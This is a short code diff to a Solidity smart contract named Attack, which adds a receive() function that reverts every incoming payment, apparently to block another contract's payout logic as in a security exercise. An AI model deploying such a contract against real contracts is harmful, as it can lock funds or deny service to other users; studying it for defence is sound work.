@@ -8,4 +8,8 @@ contract Attack {
         (bool success, ) = addr.call{value: valuee}("");
         require(success, "Transfer failed");
     }
+
+    receive() external payable {
+        revert();
+    }
 }
